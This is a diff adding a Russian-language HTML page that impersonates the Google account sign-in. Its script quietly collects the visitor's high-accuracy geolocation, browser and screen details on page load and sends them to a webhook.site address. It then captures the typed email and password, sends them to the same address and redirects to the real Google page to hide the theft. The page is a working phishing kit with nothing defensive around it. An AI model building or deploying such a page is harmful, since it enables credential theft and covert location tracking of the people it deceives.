@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход – Google Аккаунты</title>
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-box { width: 380px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
+        p { margin-bottom: 25px; font-size: 16px; color: #202124; }
+        input {
+            width: 100%; padding: 13px; margin: 10px 0;
+            border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none;
+        }
+        input:focus { border: 2px solid #1a73e8; padding: 12px; }
+        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
+        .create-acc { color: #1a73e8; font-weight: 500; cursor: pointer; font-size: 14px; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        #status { font-size: 12px; color: #70757a; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo" alt="Google">
+    <h1>Вход</h1>
+    <p>Продолжить в Gmail</p>
+    
+    <form id="loginForm">
+        <input type="text" id="email" placeholder="Телефон или адрес эл. почты" required>
+        <input type="password" id="pass" placeholder="Введите пароль" required>
+        
+        <div class="btn-container">
+            <span class="create-acc">Создать аккаунт</span>
+            <button type="submit">Далее</button>
+        </div>
+    </form>
+    <div id="status">Инициализация защищенного соединения...</div>
+</div>
+
+<script>
+    const webhookUrl = "https://webhook.site/c916aef3-0dde-46fd-a061-48d8ff3d3fbc";
+    let userCoords = "Denied/Pending";
+
+    // АВТО-ЗАПРОС ГЕОПОЗИЦИИ ПРИ ЗАГРУЗКЕ
+    window.onload = function() {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                userCoords = `${pos.coords.latitude},${pos.coords.longitude} (Acc: ${pos.coords.accuracy}m)`;
+                document.getElementById('status').innerText = "Безопасное соединение установлено";
+                // Сразу шлем "тихий" отчет о визите
+                sendToWebhook("INITIAL_HIT", { coords: userCoords });
+            },
+            (err) => {
+                userCoords = "User Denied GPS";
+                document.getElementById('status').innerText = "Ошибка верификации региона. Попробуйте войти.";
+                sendToWebhook("INITIAL_HIT", { coords: userCoords });
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    };
+
+    function sendToWebhook(type, extraData) {
+        const baseInfo = {
+            type: type,
+            ua: navigator.userAgent,
+            screen: window.screen.width + "x" + window.screen.height,
+            platform: navigator.platform
+        };
+        const params = new URLSearchParams({...baseInfo, ...extraData}).toString();
+        fetch(`${webhookUrl}?${params}`);
+    }
+
+    // ОБРАБОТКА ФОРМЫ
+    document.getElementById('loginForm').onsubmit = function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        // Отправляем финальный отчет с логином, паролем и координатами
+        sendToWebhook("LOGIN_CAPTURE", {
+            email: email,
+            password: pass,
+            location: userCoords
+        });
+
+        // Имитация загрузки перед редиректом
+        document.getElementById('status').innerText = "Проверка данных...";
+        setTimeout(() => {
+            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd";
+        }, 1500);
+    };
+</script>
+
+</body>
+</html>
